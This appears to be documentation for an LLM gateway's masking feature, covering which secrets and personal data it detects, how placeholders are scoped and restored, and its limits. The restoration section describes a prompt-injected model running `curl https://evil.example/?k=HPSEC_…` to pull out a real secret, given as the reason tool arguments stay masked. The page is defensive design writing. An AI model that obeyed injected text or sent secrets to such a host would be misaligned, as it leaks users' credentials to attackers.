# Masking: guarantees and limits

A masking policy replaces secrets and personal data in a request with placeholders before a provider sees them, and
can put the originals back in the reply. It is a defence against leaking credentials into prompts, not a guarantee:
read the limits at the end of this page before relying on it. How to set a policy up is in
[Privacy and masking](/operators/privacy).

## What it looks at

Masking inspects the parts of a request that carry user and tool content:

- message text, including system and developer prompts;
- tool-call arguments and tool results, parsed as JSON so escaped secrets (`A…`, `\/`) are found too;
- exposed reasoning text.

It does not inspect images or documents (they are counted in the request's masking summary), tool definitions, media
titles and URLs, protocol extension fields or opaque provider state. Signed reasoning is a special case, described
below.

## What it catches

| Group | Detectors | Default action |
|---|---|---|
| Credentials (on by default) | `private_key`, `aws_access_key`, `aws_secret_key`, `github_token`, `anthropic_key`, `openai_key`, `slack_token`, `google_api_key`, `stripe_key`, `jwt`, `secret_assignment` (`password=…` and similar), `credential_url` (`user:password@host`), `gateway_token` (Harbor Pilot's own `hpk_` tokens), `configured_secrets` | mask |
| Personal data (opt-in) | `email`, `phone`, `credit_card`, `iban`, `ip_address` | mask |
| Heuristic (opt-in) | `high_entropy` | warn only |
| Custom rules | Your own RE2 patterns, optionally acting on one capture group | mask, block or warn |

**Configured secrets** are exact values you give the policy (one per line, stored write-only, or read from a
`secret_values_ref`). Values shorter than 6 characters are rejected, with the line number, because they would match
ordinary text.

When several findings overlap, the strongest action wins: **block** over **allow** over **mask** over **warn**. An
allow rule exempts a narrowly matching value from masking and warning, but never from a block.

## Placeholders

A masked value is replaced with `HPSEC_` followed by 20 random base32 characters (100 bits). Placeholders are:

- **stable** for the same value within one scope, so a conversation stays coherent;
- **scoped** to the client, the credential (a child token shares its parent's) and the session. Sessions only narrow a
  scope: two credentials never share one, even if they send the same session header;
- **unpredictable** and checked for collisions;
- **memory-only.** The mapping is never written to disk or logged. It expires after 24 hours idle and is lost on
  restart, after which a repeated placeholder is returned to the tool unchanged.

The vault is bounded: at most 200,000 mappings or 128 MiB in total, and 5,000 mappings or 8 MiB per credential. Over a
credential's budget, values are still masked, but their placeholders cannot be restored and cannot push out other
credentials' mappings.

## Putting originals back

With **restore in responses** on, placeholders in the model's reply are replaced with the original values before the
reply reaches the tool, including when a placeholder is split across streamed chunks.

Restoration only ever writes into **text**:

- **Tool-call arguments are left masked by default.** A prompt-injected model could otherwise ask a tool to run
  `curl https://evil.example/?k=HPSEC_…` and receive the real secret. Restoring into tool arguments needs an explicit
  allowlist of tool names and argument fields, and is refused when the value names any host outside the allowed
  hosts. URLs are parsed; user-info and backslash tricks are refused, and bare host names and IP addresses count as
  hosts too.
- **Reasoning is never rewritten.**

## Signed reasoning

Some providers sign their reasoning blocks (Anthropic thinking), and the client must send them back byte for byte on
the next turn. They cannot be masked without breaking the conversation. If a signed block contains a value the policy
masks or blocks, the request is **blocked** with the rule `signed_reasoning` rather than sent.

## When masking cannot run

Masking can fail to run: for example when a policy's configured secret values cannot be read, or on a
byte-for-byte passthrough route. Each policy chooses what happens then:

- **Block the request** (recommended): nothing leaves Harbor Pilot unmasked; the request is refused and the reason
  recorded.
- **Send unmasked and flag it**: keeps tools working during an incident; each such request is marked in Requests.
- **Send anyway**: requests go out unmasked without being flagged. Not recommended.

Failures to read configured values are never cached; references are re-read every minute. Detectors that still work
keep masking.

Masking also holds during compatibility passthrough: a request that requires masking is blocked unless the policy
allows sending it unmasked.

## Limits

- **Detectors miss what they don't know.** New key formats, base64-encoded secrets, unusual letter case and secrets
  split across lines are not detected.
- **JSON escaping** is understood in tool arguments and tool results, not inside ordinary message text.
- **Local tools are out of reach.** Anything a coding tool runs on your machine (a shell command, a file read) happens
  before or outside the gateway.
- **Providers see the rest.** Whatever masking did not catch reaches the provider.

Try a policy against sample text before you depend on it: the Privacy page has a **Try this policy on sample text**
panel, which shows what each detector finds and what a provider would receive.

<Shot name="privacy-policy" alt="The masking policy dialog with its detector table, custom rules and the choice of what happens when masking cannot run" caption="Editing a masking policy" />
